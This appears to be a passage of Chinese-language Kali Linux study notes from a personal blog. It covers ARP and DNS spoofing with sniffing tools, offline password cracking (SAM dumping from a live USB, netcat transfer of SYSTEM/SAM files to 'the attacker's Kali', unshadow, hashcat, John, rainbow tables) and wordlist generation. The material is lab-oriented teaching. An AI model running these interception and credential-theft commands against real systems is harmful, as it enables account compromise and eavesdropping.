<li>ARP协议（IP地址解析程MAC地址）<ul>
<li>免费ARP</li>
<li>基于广播学习</li>
<li>以太网头、ARP头</li>
<li>▲ 请求、响应相对独立（不请求也可以响应，可以人为构造响应包）</li>
<li>▲ 基于传闻的协议（无条件接受响应包，ARP地址欺骗根源）</li>
</ul>
</li>
</ul>
<h4 id="2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）"><a href="#2-ARP地址欺骗（Win-7-→-Kali，单向欺骗）" class="headerlink" title="2. ARP地址欺骗（Win 7 → Kali，单向欺骗）"></a>2. ARP地址欺骗（Win 7 → Kali，单向欺骗）</h4><ul>
<li><strong><code>🔺命令：ping 网关</code></strong>（查看网络连通性）</li>
<li><strong><code>🔺命令：arp -a</code></strong>（查看网关地址）</li>
<li>使用OmniPeek构造ARP数据包，先抓取ARP的数据包</li>
<li><strong><code>🔺命令：arp -d</code></strong>（清除ARP缓存）</li>
<li><strong><code>🔺命令：ping 网关</code></strong>（重新发arp包）</li>
<li>选取ARP Response的数据包，Send → Edit Send Packet</li>
<li><strong><code>🔺命令：ping Kali的IP地址/arp -a</code></strong>（查看Kali的MAC地址）</li>
<li>Ethernet → 修改目的地的MAC地址为Kali的MAC地址</li>
<li>Ethernet → 修改源地址的MAC地址为Win7的MAC地址</li>
<li>ARP → Target Hardware Addr → Kali的MAC地址</li>
<li>ARP → Target Internet Addr → Kali的IP地址</li>
<li>Send → Send Window → Transmit One（可能需要持续发包）</li>
<li>Kali查看arp → <strong><code>🔺命令：arp -an</code></strong></li>
<li>Win7/kali抓包都可以看到ARP地址欺骗效果（发送ping数据包）</li>
<li>▲ 2020.1.27 Omnipeek need a Universal C Runtime</li>
</ul>
<h4 id="3-ARP地址欺骗（Kali-→-Win7）"><a href="#3-ARP地址欺骗（Kali-→-Win7）" class="headerlink" title="3. ARP地址欺骗（Kali → Win7）"></a>3. ARP地址欺骗（Kali → Win7）</h4><ul>
<li>手动修改数据包实现ARP欺骗</li>
<li>arpspoof（双向欺骗+路由转发）<ul>
<li><strong><code>🔺命令：echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></strong> </li>
<li><strong><code>🔺命令：arpspoof -t（目标） 1.1.1.12 -r（路由器） 1.1.1.1</code></strong>（发送的是arp的Rely）</li>
</ul>
</li>
<li>网络嗅探<ul>
<li>driftnet（传输图片的还原）<ul>
<li>-i（选择端口）</li>
<li>-a（存放保存）</li>
<li>-d（存放的路径）</li>
<li>-s（声音文件的保存）</li>
</ul>
</li>
<li><strong><code>🔺命令：driftnet -i eth0 -a -d /root/Desktop/tem -s</code></strong></li>
<li><strong><code>🔺命令：webspy -i eth0 1.1.1.1</code></strong>（抓取网络url地址）▲ 2020.1.27只能一个一个进行截取</li>
<li><strong><code>🔺命令：urlsnarf -i eth0</code></strong>（访问端口截断解析）</li>
<li><strong><code>🔺命令：dsniff -i eth0 -m</code></strong>（密码嗅探截获）<ul>
<li>/usr/share/dsniff/dsniff.services（支持协议解码类型）</li>
</ul>
</li>
<li><strong><code>🔺命令：dnsspoof -i eth0 -f /usr/lib/x86_64-linux-gnu/dnsspoof.hosts</code></strong>（DNS欺骗）<ul>
<li><strong><code>🔺命令：vi /usr/lib/x86_64-linux-gnu/</code></strong>dnsspoof.hosts（侦听目标机器53端口）</li>
<li>192.168.1.1 → *.taobao.com</li>
<li>Win7访问<a href="http://www.taobao.com（发生重定向）" target="_blank" rel="noopener">www.taobao.com（发生重定向）</a></li>
<li>▲ 2020.1.27 dnsspoof无法进行重定向，无法达到DNS欺骗的目的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）"><a href="#4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）" class="headerlink" title="4. DNS代理欺骗（Kali → Win7，实现流量的重定向）"></a>4. DNS代理欺骗（Kali → Win7，实现流量的重定向）</h4><ul>
<li>前提：有能力修改客户端的网络参数的配置（DNS/Host修改配置）</li>
<li>dnschef<ul>
<li>–fakeip（欺骗解析到的IP地址）</li>
<li>–fakedomains（伪造欺骗的域名）</li>
<li>–interface（进行网卡欺骗的动作，DNS侦听动作）</li>
</ul>
</li>
<li><strong><code>🔺命令：dnschef --fakeip=1.1.1.10 --fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2（Kali主机IP）-q</code></strong></li>
<li>将被害者DNS指向伪造的DNS服务器（Win7修改DNS服务器）</li>
<li>Win7和Kali进行抓包比对</li>
<li>ping一个没有欺骗的域名看是否正常运作</li>
<li>▲ 2020.1.27可进行正常运行，也能截获到数据包，但无法进行重定向</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url">Kali Linux笔记(六十一)：离线密码破解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-26T22:35:12+08:00">
                2020-01-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-离线密码破解"><a href="#1-离线密码破解" class="headerlink" title="1. 离线密码破解"></a>1. 离线密码破解</h4><ul>
<li>身份认证<ul>
<li>禁止明文传输密码（存在大的安全问题）</li>
<li>每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</li>
<li>服务器端用户数据应加严加密保存</li>
<li>服务器端保存用户密码的哈希值（进行哈希值匹配）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐哈希算法是单向算法，逆向碰撞在数学上是存在不可行性，只能通过碰撞去破解</code></pre></blockquote>
<ul>
<li>破解思路<ul>
<li>嗅探获取密码HASH</li>
<li>利用漏洞登陆服务器并从用户数据库获取HASH</li>
<li>识别HASH类型（长度、字符集）</li>
<li>利用离线破解工具碰撞密码HASH</li>
</ul>
</li>
<li>优势<ul>
<li>离线不会触发密码锁定机制</li>
<li>不会产生大量登陆失败日志引起管理员注意</li>
</ul>
</li>
<li>HASH识别工具<ul>
<li>hash-identifier</li>
<li>Hashid</li>
<li>▲ 可能识别错误或无法识别</li>
<li>安装浏览器插件：hashr ▲ 2020.1.25无法找到hashr插件</li>
</ul>
</li>
<li><strong><code>🔺命令：hash-identifier</code></strong><ul>
<li>直接贴入hash值</li>
</ul>
</li>
<li><strong><code>🔺命令：hashid hash值</code></strong></li>
</ul>
<h4 id="2-Windows-HASH获取–已有登陆账号（Win7）"><a href="#2-Windows-HASH获取–已有登陆账号（Win7）" class="headerlink" title="2. Windows HASH获取–已有登陆账号（Win7）"></a>2. Windows HASH获取–已有登陆账号（Win7）</h4><ul>
<li>SAM数据库，身份提权等   </li>
<li>利用漏洞：Pwdump、fgdump、 mimikatz、wce </li>
</ul>
<h4 id="3-Windows-HASH获取–未有登陆账号（Win7）"><a href="#3-Windows-HASH获取–未有登陆账号（Win7）" class="headerlink" title="3. Windows HASH获取–未有登陆账号（Win7）"></a>3. Windows HASH获取–未有登陆账号（Win7）</h4><ul>
<li>物理接触：samdump2</li>
<li>插入一张Kali ISO 启动虚拟机，用Kali启动电脑，进入Live模式</li>
<li><strong><code>🔺命令：fdisk -l</code></strong>（查看本地硬盘）</li>
<li><strong><code>🔺命令：mount /dev/sda1 /mdedia</code></strong>（小容量分区，引导文件）</li>
<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong>（大容量分区，操作系统文件）</li>
<li><strong><code>🔺命令：ls /mnt</code></strong>（存在windows目录）</li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong><ul>
<li>SYSTEM目录保存一个密钥，用于加密SAM数据库，默认不设置，设置后需输入两次密码 </li>
</ul>
</li>
<li><strong><code>🔺命令：samdump2 SYSTEM SAM -o sam.hash</code></strong><ul>
<li>Win7/Win8默认禁用Administrator/Guest账号，需要手动右键运行</li>
<li>Win7/Win8废弃LMHash，只用NTLMHash</li>
</ul>
</li>
<li>利用nc传输HASH<ul>
<li><strong><code>🔺命令：nc -nvlp 3333</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 3333</code></strong>（Window上的Kali）</li>
</ul>
</li>
</ul>
<h4 id="4-Hashcat"><a href="#4-Hashcat" class="headerlink" title="4. Hashcat"></a>4. Hashcat</h4><ul>
<li>开源多线程密码破解工具 </li>
<li>支持80多种加密算法破解</li>
<li>基于CPU的计算能力破解</li>
<li>支持通配符，模式（hashcat -h）</li>
<li>常用参数/命令<ul>
<li>-m（hash值的类型）<ul>
<li><strong><code>🔺命令：echo 哈希值 sam.hash</code></strong></li>
<li><strong><code>🔺命令：hashcat -m 1000 sam.hash pass.lst</code></strong>（NTLM）</li>
<li><strong><code>🔺命令：hashcat -m 100 hash.dump pass.lst</code></strong>（SHA-1）</li>
<li><strong><code>🔺命令：hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d</code></strong>（MD5）</li>
</ul>
</li>
<li>-a（选用字典的模式）</li>
<li>-b（测试当前机器CPU计算能力）</li>
<li><strong><code>🔺命令：hashcat -m 100 -a 3 hash -i --increment-min（增量） 6 --increment-max 8 ?l?l?l?l?l?l?l?l</code></strong> </li>
</ul>
</li>
<li>通配符<ul>
<li>?l = abcdefghijklmnopqrstuvwxyz </li>
<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
<li>?d = 0123456789 </li>
<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
<li>?a = ?l?u?d?s </li>
<li>?b = 0x00 - 0xff</li>
</ul>
</li>
<li>六种模式 <ul>
<li>0 Straight：字典破解 </li>
<li>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21） </li>
<li>2 Toggle case：尝试字典中所有密码的大小写字母组合 </li>
<li>3 Brute force：指定字符集（或全部字符集）所有组合 </li>
<li>4 Permutation：字典中密码的全部字符置换组合（12 21） </li>
<li>5 Table-lookup：程序为字典中所有密码自动生成掩码</li>
</ul>
</li>
<li>▲ 2020.1.26This device’s constant buffer size is too small/This device’s local mem size is too small猜测需要用到显卡GPU</li>
<li>▲ 2020.1.26从hashcat 3.30开始，在虚拟机中运行hashcat经常会报错，提示GPU错误。这是由于从该版本开始，hashcat对于Intel CPU会自动检测Intel OpenCL运行时，即是否支持GPU破解。如果不支持，就会停止运行。还有需要缓存足够，用户可添加隐藏选项–force来强制运行，也不一定好使。</li>
<li>▲ 2020.1.26在物理机上可以正常使用</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=a3a1s41srxGRQ28Vf-m3XnK9v0MSIZAVrmgjNT26LcpW1tUME3MHOoSRrkVm82w8LY5F_jyX9hZLQQAMqN8Clbu4Lk8m_1iuHiT_3edmWE00qDaUJmPHAQ&file_name=/hashcat.PNG" alt="hashcat使用"></p>
<h4 id="5-Syskey（Window的操作系统工具）"><a href="#5-Syskey（Window的操作系统工具）" class="headerlink" title="5. Syskey（Window的操作系统工具）"></a>5. Syskey（Window的操作系统工具）</h4><ul>
<li>使用Bootkey利用RC4算法加密SAM数据库<ul>
<li>Win+R → syskey</li>
<li>设置Bootkey</li>
<li>在软盘上保存启动密码/在本机上保存启动密码</li>
<li>尝试破解Bootkey加密后的密码（两次密码不对应，也难以破解）</li>
</ul>
</li>
<li>Bootkey保存于SYSTEM文件中 </li>
<li>Bkhive <ul>
<li>从SYSTEM文件中提取bootkey </li>
<li>Kali 2.0 抛弃了bkhive（工具已经长期不更新，安装过程问题也较多）</li>
<li>编译安装：<a href="http://http.us.debian.org/debian/pool/main/b/bkhive/" target="_blank" rel="noopener">http://http.us.debian.org/debian/pool/main/b/bkhive/</a><ul>
<li>下载tar.gz的源码包（bkhive_1.1.1.orig.tar.gz）</li>
<li><strong><code>🔺命令：tar -zxvf *.tar.gz</code></strong></li>
<li><strong><code>🔺命令：cd bkhive</code></strong></li>
<li><strong><code>🔺命令：make</code></strong></li>
<li><strong><code>🔺命令：make install</code></strong> </li>
<li><strong><code>🔺命令：apt-get -f install</code></strong></li>
<li><strong><code>🔺命令：apt-get purge samdump2</code></strong>（卸载高版本的samdump）</li>
<li><strong><code>🔺命令：apt-get install libssl-dev</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：nc -nvlp 333 &gt; SYSTEM</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 333 &lt; SYSTEM -q 1</code></strong>（Window上的Kali）</li>
<li><strong><code>🔺命令：nc -nvlp 333 &gt; SAM</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 333 &lt; SAM -q 1</code></strong>（Window上的Kali）</li>
<li><strong><code>🔺命令：bkhive SYSTEM key</code></strong> </li>
<li><strong><code>🔺命令：samdump2 SAM key</code></strong>（版本已更新，不再支持此功能）</li>
</ul>
</li>
<li>建议使用 Kali 1.x（Kali 1.1版本可以实现）▲ 2020.1.26暂无可靠的Kali 1.x版本</li>
</ul>
<h4 id="6-Oclhashcat"><a href="#6-Oclhashcat" class="headerlink" title="6. Oclhashcat"></a>6. Oclhashcat</h4><ul>
<li>号称世界上最快、唯一的基于GPGPU的密码破解软件 </li>
<li>免费开源、支持多平台、支持分布式、150+hash算法</li>
<li>硬件支持<ul>
<li>虚拟机中无法使用 </li>
<li>支持CUDA技术的Nvidia显卡 </li>
<li>支持OpenCL技术的AMD显卡 </li>
<li>安装相应的驱动</li>
</ul>
</li>
<li>限制<ul>
<li>最大密码长度55字符 </li>
<li>使用Unicode的最大密码长度27字符</li>
</ul>
</li>
<li>关于版本<ul>
<li>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</li>
<li>▲ 2020.1.26 Kali机子上只有hashcat，只支持有GPU的密码破解</li>
</ul>
</li>
<li>命令<ul>
<li><strong><code>🔺命令：oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</code></strong></li>
</ul>
</li>
<li>通配符<ul>
<li>?l = abcdefghijklmnopqrstuvwxyz </li>
<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
<li>?d = 0123456789 </li>
<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
<li>?a = ?l?u?d?s </li>
<li>?b = 0x00 - 0xff</li>
</ul>
</li>
</ul>
<h4 id="7-RainbowCrack"><a href="#7-RainbowCrack" class="headerlink" title="7. RainbowCrack"></a>7. RainbowCrack</h4><ul>
<li>基于时间记忆权衡技术生成彩虹表（保存计算好的密码字典）</li>
<li>提前计算密码的HASH值，通过比对HASH值破解密码</li>
<li>计算HASH的速度很慢，修改版支持CUDA GPU <ul>
<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
</ul>
</li>
<li>KALI中包含RainbiwCrack工具<ul>
<li>rtgen：预计算，生成彩虹表，耗时的阶段 </li>
<li>rtsort：对rtgen生成的彩虹表进行排序 </li>
<li>rcrack：查找彩虹表破解密码 </li>
<li>以上命令必须顺序使用</li>
</ul>
</li>
<li>彩虹表 <ul>
<li>密码明文、HASH值、HASH算法、字符集、明文长度范围 </li>
</ul>
</li>
<li>下载彩虹表<ul>
<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
<li><a href="http://rainbowtables.shmoo.com/" target="_blank" rel="noopener">http://rainbowtables.shmoo.com/</a></li>
</ul>
</li>
<li>生成彩虹表–rtgen <ul>
<li>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160 </li>
<li><strong><code>🔺命令：rtgen md5 loweralpha（使用的字符集） 1（最小长度） 5（最大长度） 0（表索引） 10000 10000 0</code></strong> </li>
<li>计算彩虹表时间可能很长</li>
</ul>
</li>
<li>彩虹表排序–rtsort<ul>
<li><strong><code>🔺命令：cd /usr/share/rainbowcrack</code></strong> </li>
<li><strong><code>🔺命令：rtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</code></strong></li>
</ul>
</li>
<li>密码破解–rcrack<ul>
<li><strong><code>🔺命令：rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592</code></strong> </li>
<li><strong><code>🔺命令：rcrack *.rt -l hash.txt</code></strong></li>
</ul>
</li>
<li>▲ 2020.1.26自生成的彩虹表无法被找到</li>
</ul>
<h4 id="8-John"><a href="#8-John" class="headerlink" title="8. John"></a>8. John</h4><ul>
<li>支持众多服务应用的加密破解 <ul>
<li><strong><code>🔺命令：john --list=formats</code></strong></li>
</ul>
</li>
<li>支持某些对称加密算法破解</li>
<li>模式 <ul>
<li>Wordlist：基于规则的字典破解 </li>
<li>Single crack：默认被首先执行，使用Login/GECOS信息尝试破解 </li>
<li>Incremental：所有或指定字符集的暴力破解 </li>
<li>External：需要在主配配文件中用C语言子集编程</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐hashcat不支持对称加密算法的破解/john支持单向，对称，非对称加密算法破解
⭐用户信息（GECOS信息，包括名字，电话等，在/etc/passwd中）
1./etc/passwd存放账号的信息，/etc/shadow存放账号的密码信息
2./bin/false → 不可用此账号登陆，/bin/bash → 可用此账号登陆
⭐chin（可对用户GECOS信息进行修改）</code></pre></blockquote>
<ul>
<li>默认破解模式 <ul>
<li>Single、wordlist、incremental（按顺序尝试三种模式）</li>
<li>主配置文件中指定默认wordlist</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐[Options]（/etc/john/john.conf）
#Default wordlist file name (including in batch mode)
Wordlist=$JOHN/password.lst</code></pre></blockquote>
<ul>
<li>破解Linux系统账号密码 <ul>
<li><strong><code>🔺命令：unshadow /etc/passwd /etc/shadow &gt; pass.txt</code></strong>（用户名密码文件的合并）</li>
<li><strong><code>🔺命令：john pass.txt</code></strong> </li>
<li><strong><code>🔺命令：john --show</code></strong> （密码保存在文件下）</li>
<li>(.john）john.pot–密码保存/john.log–日志文件/john.rec–破解过程信息</li>
</ul>
</li>
<li>破解windows密码 <ul>
<li><strong><code>🔺命令：john sam.hash --wordlist=password.lst --format=nt</code></strong> </li>
<li><strong><code>🔺命令：john sam.hash --format=nt --show</code></strong></li>
</ul>
</li>
<li>Johnny图形化界面的John</li>
</ul>
<h4 id="9-Ophcrack（图形化界面）"><a href="#9-Ophcrack（图形化界面）" class="headerlink" title="9. Ophcrack（图形化界面）"></a>9. Ophcrack（图形化界面）</h4><ul>
<li>基于彩虹表的LM、NTLM密码破解软件</li>
<li>需要Load一个彩虹表，安装解压后的文件（官方网站下载彩虹表）</li>
<li>彩虹表：<a href="http://ophcrack.sourceforge.net/tables.php" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/tables.php</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/" itemprop="url">Kali Linux笔记(五十九)：密码破解--身份认证、字典</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:29+08:00">
                2020-01-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><ul>
<li>目标系统实施了强安全措施<ul>
<li>安装了所有补丁</li>
<li>无任何已知漏洞</li>
<li>无应用层漏洞</li>
<li>攻击面最小化（端口最小化，利用化）</li>
</ul>
</li>
<li>社会工程学</li>
<li>获取目标系统用户身份<ul>
<li>非授权用户不受信，认证用户可以访问守信资源</li>
<li>已有用户账号权限受限，需要提权</li>
<li>不会触发系统报警（非上传木马，用正常管理员登陆）</li>
</ul>
</li>
</ul>
<h4 id="2-身份认证方法"><a href="#2-身份认证方法" class="headerlink" title="2. 身份认证方法"></a>2. 身份认证方法</h4><ul>
<li>证明你是你声称你是的那个人<ul>
<li>你知道什么（账号密码、pin、passphrase）</li>
<li>你有什么（令牌、token、key、证书、密宝、手机）</li>
<li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</li>
<li>以上方法结合使用（多因素身份认证）</li>
</ul>
</li>
<li>基于互联网的身份认证仍以账号密码为主要形式</li>
</ul>
<h4 id="3-密码破解方法"><a href="#3-密码破解方法" class="headerlink" title="3. 密码破解方法"></a>3. 密码破解方法</h4><ul>
<li>人工猜解<ul>
<li>垃圾桶工程</li>
<li>被动信息收集</li>
</ul>
</li>
<li>基于字典暴力破解（主流）</li>
<li>键盘空间字符爆破</li>
<li>字典<ul>
<li>保存有用户和密码的文本文件</li>
<li>/usr/share/wordlist</li>
<li>/usr/share/wfuzz/wordlist</li>
<li>/usr/share/seclists</li>
<li>▲ rockyou.txt</li>
</ul>
</li>
</ul>
<h4 id="4-字典–Crunch"><a href="#4-字典–Crunch" class="headerlink" title="4. 字典–Crunch"></a>4. 字典–Crunch</h4><ul>
<li>键盘空间字符爆破<ul>
<li>全键盘空间字符</li>
<li>部分键盘空间字符（基于规则）</li>
<li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li>
</ul>
</li>
<li>crunch <min-len><max-len>[<charset string>][options]<ul>
<li><charset string>默认是小写字符</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</code></strong><ul>
<li>-b（按大小分割【kb/kib、mb/mib、gb/gib】）kb、mb、gb → 1000/kib、mib、gib → 1024</li>
<li>-c（每个字典的行数）</li>
<li>以上两个参数必须与-o START结合使用</li>
<li>-d（同一字符连贯出现数量【11/aaa】）</li>
</ul>
</li>
<li>字符集<ul>
<li><strong><code>🔺命令：cat /usr/share/crunch/charset.lst</code></strong></li>
<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></strong></li>
</ul>
</li>
<li>无重复字符集<ul>
<li><strong><code>🔺命令：crunch 1 1 -p（指定字符作为生成字符） 1234567890 | more</code></strong></li>
<li>必须是最后一个参数</li>
<li>最大、最小字符长度失效，但必须存在</li>
<li>与-s参数不兼容（-s指定起始字符串）</li>
<li><strong><code>🔺命令：crunch 4 4 0123456789 -s 9900</code></strong></li>
</ul>
</li>
<li>读取文件中每行内容作为基本字符生成字典<ul>
<li><strong><code>🔺命令：crunch 1 1 -q</code></strong> read（文件中每段简单设置为一个字符，然后进行拼接调换）</li>
<li>最小、最大字符长度失效，但必须存在</li>
<li>每段在生成的字典文件中，每行只出现一次（4行文件=4<em>3</em>2*1=24行字典）</li>
</ul>
</li>
<li>字典组成规则<ul>
<li><strong><code>🔺命令：crunch 6 6 -t @,%%^^ | more</code></strong></li>
<li>@：小写字母 lalpha</li>
<li>,：大写字母 ualpha</li>
<li>%：数字 numeric</li>
<li>^：符号 symbols</li>
</ul>
</li>
<li>输出文件压缩<ul>
<li><strong><code>🔺命令：crunch 4 4 -t @,%^ -o 1.txt -z 7z</code></strong></li>
<li>其他压缩格式：gzip、bzip2、lzma</li>
<li>-7z压缩比率最大</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lsb mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</code></strong>（@表示字符集所有组合，特殊情况）</li>
<li><strong><code>🔺命令：crunch 4 5 -p dog cat bird</code></strong>（后面三个词语是为三个基本字符）</li>
<li><strong><code>🔺命令：crunch 5 5 abc DEF + \!@# -t ,@^%,</code></strong> （从指定的字符中挑选）<ul>
<li><ul>
<li>占位符（表示所有）</li>
</ul>
</li>
<li>\ 转义符（空格、符号）</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 5 5 -t ddd%% -p dog cat bird</code></strong><ul>
<li>任何不同于-p 参数指定的值都是占位符</li>
<li>d无效，不同于-p </li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 5 5 -d 2@ -t @@@%%</code></strong>（小写字母不能超过两个连续相同）</li>
<li>组合应用（边生成边使用边丢弃）<ul>
<li><strong><code>🔺命令：crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –</code></strong></li>
<li><strong><code>🔺命令：crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -</code></strong></li>
</ul>
</li>
</ul>
<h4 id="5-字典–CUPP"><a href="#5-字典–CUPP" class="headerlink" title="5. 字典–CUPP"></a>5. 字典–CUPP</h4><ul>
<li>按个人信息生成其专属的密码字典（适合破解个人信息的个人账号密码）</li>
<li>CUPP：Common User Password Profiler<ul>
<li><strong><code>🔺命令：git clone https://github.com/Mebus.cupp.git</code></strong></li>
<li><strong><code>🔺命令：python cupp.py -i</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-字典–cewl"><a href="#6-字典–cewl" class="headerlink" title="6. 字典–cewl"></a>6. 字典–cewl</h4><ul>
<li>通过收集网站信息生成字典</li>
<li><strong><code>🔺命令：cewl 1.1.1.1（或域名） -m 3 -d 3 -e -c -v -w a.txt</code></strong><ul>
<li>-m（最小单词长度）</li>
<li>-d（爬网深度）</li>
<li>-e（收集包含email地址信息）</li>
<li>-c（每个单词出现次数）</li>
<li>支持基本、摘要身份认证</li>
<li>支持代理</li>
</ul>
